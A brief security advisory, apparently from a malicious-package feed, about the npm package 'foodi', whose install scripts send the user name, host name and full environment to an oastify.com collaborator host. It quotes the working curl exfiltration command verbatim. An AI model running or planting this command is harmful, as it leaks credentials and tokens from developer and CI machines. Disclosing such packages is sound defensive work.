summary: foodi exfiltrates environment variables and host identifiers to oastify.com on install
details: package.json declares preinstall and postinstall lifecycle scripts that both execute `curl -X POST -k -s https://y0zhmssf65c8er7btoglvt9bg2mtakc81.oastify.com -d "u=$(whoami)&h=$(hostname)&e=$(env)"`. On `npm install`, the package runs `whoami`, `hostname`, and dumps the full process environment, then POSTs the collected data to a Burp Collaborator (oastify.com) subdomain over TLS with certificate verification disabled (`-k`). Environment variables on developer and CI machines routinely contain credentials, API keys, and CI tokens. The package's main module is empty, consistent with a squat/dependency-confusion payload whose sole function is install-time exfiltration.
